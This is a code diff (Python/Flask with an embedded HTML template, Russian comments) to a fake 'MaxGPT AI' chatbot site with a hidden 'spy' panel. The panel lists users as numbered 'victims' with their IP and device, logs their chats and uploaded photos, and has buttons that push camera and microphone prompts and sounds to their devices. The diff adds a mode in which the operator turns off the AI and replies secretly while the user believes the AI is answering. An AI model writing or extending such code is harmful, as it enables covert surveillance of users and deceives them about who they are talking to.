@@ -8,6 +8,7 @@ user_active_chat = {}
 user_states = {}
 pending_commands = {}
 active_victims = {}
+manual_control = {}  # Новое: хранит IP пользователей, у которых перехвачен чат
 victim_counter = 0
 chat_logs = []
 
@@ -605,21 +606,29 @@ SPY_PAGE = """<!DOCTYPE html>
         .section-title { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: space-between; }
         .victims-grid { display: flex; flex-direction: column; gap: 14px; margin-bottom: 30px; }
         .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
+        .victim-card.manual { border-color: #f59e0b; background: #1a1612; }
         .victim-head { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; flex-wrap: wrap; gap: 8px; }
         .victim-name { font-size: 15px; font-weight: 800; color: #a78bfa; display: flex; align-items: center; gap: 8px; }
         .badges-wrap { display: flex; gap: 6px; flex-wrap: wrap; }
         .badge { font-family: monospace; font-size: 11px; padding: 3px 8px; border-radius: 6px; display: flex; align-items: center; gap: 5px; }
         .badge-ip { background: rgba(245, 158, 11, 0.1); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.2); }
         .badge-dev { background: rgba(59, 130, 246, 0.1); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.2); }
+        .badge-manual { background: rgba(245, 158, 11, 0.2); color: #f59e0b; border: 1px solid #f59e0b; font-weight: bold; }
         .action-btns { display: flex; gap: 6px; flex-wrap: wrap; }
         .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 11.5px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
         .btn-act:hover { filter: brightness(1.1); }
-        .btn-shutter { background: #ef4444; } .btn-custom { background: #10b981; } .btn-beep { background: #f59e0b; } .btn-cam { background: #3b82f6; } .btn-mic { background: #8b5cf6; } .btn-del { background: #dc2626; margin-left: auto; }
+        .btn-shutter { background: #ef4444; } .btn-custom { background: #10b981; } .btn-beep { background: #f59e0b; } .btn-cam { background: #3b82f6; } .btn-mic { background: #8b5cf6; } .btn-manual { background: #d97706; } .btn-del { background: #dc2626; margin-left: auto; }
+        
+        .manual-box { background: rgba(245, 158, 11, 0.08); border: 1px dashed #f59e0b; border-radius: 10px; padding: 12px; display: flex; flex-direction: column; gap: 8px; margin-top: 6px; }
+        .manual-input { flex: 1; background: #090a0f; border: 1px solid rgba(255,255,255,0.2); color: #fff; padding: 10px; border-radius: 8px; font-size: 13.5px; outline: none; resize: none; }
+        .manual-input:focus { border-color: #f59e0b; }
+
         .logs-container { display: flex; flex-direction: column; gap: 10px; }
         .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; position: relative; }
         .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 13.5px; margin-top: 6px; }
         .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 10px; border-radius: 8px; }
         .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 10px; border-radius: 8px; }
+        .log-img-thumb { max-width: 120px; border-radius: 6px; margin-top: 6px; border: 1px solid rgba(255,255,255,0.1); display: block; }
         .btn-clear-all { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
         .btn-clear-all:hover { background: #ef4444; color: #fff; }
         .btn-del-log { background: none; border: none; color: #ef4444; font-size: 13px; cursor: pointer; padding: 4px 8px; border-radius: 6px; transition: 0.2s; }
@@ -636,21 +645,38 @@ SPY_PAGE = """<!DOCTYPE html>
 <div class="victims-grid">
     {% if victims %}
         {% for ip, data in victims.items() %}
-        <div class="victim-card">
+        <div class="victim-card {% if data.manual %}manual{% endif %}">
             <div class="victim-head">
                 <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
                 <div class="badges-wrap">
+                    {% if data.manual %}
+                    <span class="badge badge-manual"><i class="fa-solid fa-user-gear"></i> РУЧНОЙ РЕЖИМ (ИИ ОТКЛЮЧЕН)</span>
+                    {% endif %}
                     <span class="badge badge-dev"><i class="fa-solid {{ data.dev_icon }}"></i> {{ data.device }}</span>
                     <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> {{ ip }}</span>
                 </div>
             </div>
             <div style="font-size:12px; color:#94a3b8;">Сообщений: <b>{{ data.msg_count }}</b></div>
+            
+            {% if data.manual %}
+            <div class="manual-box">
+                <div style="font-size: 12px; color: #f59e0b; font-weight: bold;"><i class="fa-solid fa-pen-nib"></i> Ответ от твоего лица (пользователь думает, что это ИИ):</div>
+                <div style="display: flex; gap: 8px;">
+                    <textarea class="manual-input" id="msg_{{ ip.replace('.', '_') }}" placeholder="Введите текст ответа..." rows="2"></textarea>
+                    <button class="btn-act btn-manual" style="align-self: flex-end; padding: 10px 16px;" onclick="sendManualReply('{{ ip }}')"><i class="fa-solid fa-paper-plane"></i> Отправить</button>
+                </div>
+            </div>
+            {% endif %}
+
             <div class="action-btns">
                 <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')"><i class="fa-solid fa-camera"></i> 🔊 Щелчок</button>
                 <button class="btn-act btn-custom" onclick="triggerAction('{{ ip }}', 'sound_custom')"><i class="fa-solid fa-music"></i> 🎵 Свой звук</button>
                 <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')"><i class="fa-solid fa-bell"></i> 🔔 Звонок</button>
                 <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')"><i class="fa-solid fa-video"></i> 📹 Камера</button>
                 <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')"><i class="fa-solid fa-microphone"></i> 🎙️ Микрофон</button>
+                <button class="btn-act btn-manual" onclick="toggleManual('{{ ip }}')">
+                    {% if data.manual %}<i class="fa-solid fa-robot"></i> Включить ИИ обратно{% else %}<i class="fa-solid fa-user-pen"></i> Отключить ИИ и отвечать самому{% endif %}
+                </button>
                 <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')"><i class="fa-solid fa-trash"></i> Удалить</button>
             </div>
         </div>
@@ -672,7 +698,12 @@ SPY_PAGE = """<!DOCTYPE html>
                 <button class="btn-del-log" onclick="deleteLog('{{ l.id }}')"><i class="fa-solid fa-xmark"></i></button>
             </div>
             <div class="chat-block">
-                <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
+                <div class="user-msg">
+                    <b>👤 Пользователь:</b> {{ l.user }}
+                    {% if l.img %}
+                        <br><img src="{{ l.img }}" class="log-img-thumb" alt="Прикрепленное фото">
+                    {% endif %}
+                </div>
                 <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
             </div>
         </div>
@@ -682,9 +713,19 @@ SPY_PAGE = """<!DOCTYPE html>
     {% endif %}
 </div>
 <script>
-setTimeout(() => { location.reload(); }, 3000);
 async function triggerAction(ip, cmd) {
     await fetch('/api/admin/trigger', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, command: cmd }) });
+}
+async function toggleManual(ip) {
+    await fetch('/api/admin/toggle_manual', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip }) });
+    location.reload();
+}
+async function sendManualReply(ip) {
+    let sanitizedId = ip.replaceAll('.', '_');
+    let textVal = document.getElementById('msg_' + sanitizedId).value.trim();
+    if(!textVal) return;
+    await fetch('/api/admin/manual_reply', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, reply: textVal }) });
+    location.reload();
 }
 async function deleteVictim(ip) {
     await fetch('/api/admin/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip }) });
@@ -718,7 +759,13 @@ def home():
 def spy():
     try:
         reversed_logs = list(reversed(chat_logs)) if chat_logs else []
-        return render_template_string(SPY_PAGE, logs=reversed_logs, victims=active_victims)
+        # Прокидываем флаг ручного режима в victims для рендеринга
+        victims_with_manual = {}
+        for ip, data in active_victims.items():
+            v_copy = data.copy()
+            v_copy['manual'] = manual_control.get(ip, False)
+            victims_with_manual[ip] = v_copy
+        return render_template_string(SPY_PAGE, logs=reversed_logs, victims=victims_with_manual)
     except Exception as e:
         return f"Ошибка: {str(e)}", 500
 
@@ -739,12 +786,49 @@ def admin_trigger():
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"})
 
+@app.route("/api/admin/toggle_manual", methods=["POST"])
+def admin_toggle_manual():
+    data = request.json or {}
+    target_ip = data.get("ip")
+    if target_ip:
+        current = manual_control.get(target_ip, False)
+        manual_control[target_ip] = not current
+        return jsonify({"status": "ok", "manual": manual_control[target_ip]})
+    return jsonify({"status": "error"})
+
+@app.route("/api/admin/manual_reply", methods=["POST"])
+def admin_manual_reply():
+    data = request.json or {}
+    target_ip = data.get("ip")
+    reply_text = data.get("reply", "").strip()
+    if target_ip and reply_text:
+        # Находим активный чат этого IP и добавляем сообщение от бота в историю
+        chat_id = user_active_chat.get(target_ip)
+        if chat_id and chat_id in all_chats:
+            # Берем последнее сообщение пользователя для логов
+            last_user_msg = "📎 [Картинка/Сообщение]"
+            if all_chats[chat_id]["messages"]:
+                last_user_msg = all_chats[chat_id]["messages"][-1]["user"]
+            
+            all_chats[chat_id]["messages"].append({"user": last_user_msg, "bot": reply_text, "img": None})
+            
+            ua_string = request.headers.get("User-Agent", "")
+            device_info, _ = parse_user_agent(ua_string)
+            if target_ip in active_victims:
+                device_info = active_victims[target_ip]['device']
+
+            log_id = int(time.time() * 1000)
+            chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": f"[Ручной ответ оператора] {last_user_msg}", "bot": reply_text, "img": None})
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"})
+
 @app.route("/api/admin/delete", methods=["POST"])
 def admin_delete():
     data = request.json or {}
     target_ip = data.get("ip")
     if target_ip in active_victims: del active_victims[target_ip]
     if target_ip in pending_commands: del pending_commands[target_ip]
+    if target_ip in manual_control: del manual_control[target_ip]
     return jsonify({"status": "deleted"})
 
 @app.route("/api/admin/deletelog", methods=["POST"])
@@ -789,6 +873,8 @@ def chat_api():
         chat_id = req_data.get("chat_id")
         user_ip = get_clean_ip()
         
+        user_active_chat[user_ip] = chat_id
+
         if not chat_id or chat_id not in all_chats:
             chat_id = f"chat_{int(time.time()*1000)}"
             title = (user_msg[:25] if user_msg else "Изображение") or "Новый диалог"
@@ -808,6 +894,14 @@ def chat_api():
             active_victims[user_ip]['msg_count'] += 1
             active_victims[user_ip]['device'] = device_info
             active_victims[user_ip]['dev_icon'] = dev_icon
+
+        # Проверяем: если включен ручной режим для этого IP, то ИИ НЕ отвечает сам!
+        if manual_control.get(user_ip, False):
+            # Сохраняем сообщение пользователя с картинкой, но ответ пока не даем (ждем оператора)
+            all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": "...", "img": img_data})
+            log_id = int(time.time() * 1000)
+            chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": "[Ожидает ответа оператора в ручном режиме]", "img": img_data})
+            return jsonify({"reply": "...", "chat_id": chat_id, "trigger_sound": False})
 
         image_description = ""
         if img_data:
@@ -846,12 +940,7 @@ def chat_api():
                 with urllib.request.urlopen(vision_req, timeout=25) as resp:
                     res_v = json.loads(resp.read().decode("utf-8"))
                     image_description = res_v["choices"][0]["message"]["content"]
-            except urllib.error.HTTPError as e:
-                err_body = e.read().decode()
-                print("OPENROUTER VISION HTTP ERROR:", e.code, err_body)
-                image_description = f"[Ошибка OpenRouter Vision {e.code}]"
             except Exception as e:
-                print("VISION ERROR:", str(e))
                 image_description = "[Не удалось проанализировать изображение]"
 
         final_user_input = user_msg
@@ -912,7 +1001,7 @@ def chat_api():
         all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": reply, "img": img_data})
         
         log_id = int(time.time() * 1000)
-        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": reply})
+        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": reply, "img": img_data})
         
         trigger_sound = random.random() < 0.2
 
